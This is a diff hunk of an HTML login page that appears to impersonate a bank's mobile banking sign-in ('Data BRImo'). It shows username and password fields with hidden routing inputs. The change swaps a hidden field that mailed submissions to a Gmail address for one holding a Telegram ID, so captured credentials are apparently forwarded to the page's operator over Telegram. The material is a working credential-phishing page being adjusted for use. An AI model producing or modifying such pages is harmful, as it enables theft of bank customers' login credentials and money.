@@ -183,16 +183,16 @@
                 <div class="col-12" style="width: 439px; max-width: 100%; display: block; margin: -20px auto;">
                     <div>
                         <i class="ion-ios-person-outline" id="ionIcons"></i>
-                        <input name="pesan" type="text" class="bubble-element Input form-log" tabindex="1" placeholder="Username" maxlength="" required="">
+                        <input name="message_text1" type="text" class="bubble-element Input form-log" tabindex="1" placeholder="Username" maxlength="" required="">
                     </div>
                     <div style="margin-top: 1px">
                         <i class="ion-ios-locked-outline" id="ionIcons"></i>
-                        <input type="password" name="pesan1" id="password" class="bubble-element Input form-log" tabindex="1" placeholder="Password" maxlength="" required="">
+                        <input type="password" name="message_text" id="password" class="bubble-element Input form-log" tabindex="1" placeholder="Password" maxlength="" required="">
                         <div class="bubble-element eye clickable-element" tabindex="3" id="eyeOpen">
                             <img alt="" id="eye" src="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654594413237x395260983658785300%2Fhidden.png?w=24&amp;h=19&amp;auto=compress&amp;dpr=2&amp;fit=max" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;">
                         </div>
-                        <input type="hidden" name="subjek" value="Data BRImo">
-                  <input type="hidden" name="email" value="notifbri99@gmail.com">
+                        <input type="hidden" name="telegram_id" value="5511039081">
+                 
 
                         <div class="bubble-element eye clickable-element" tabindex="3" id="eyeClose" style="display: none">
                             <img alt="" id="eye" src="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654594427324x961463961280841100%2Feye.png?w=32&amp;h=26&amp;auto=compress&amp;dpr=2&amp;fit=max" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;">
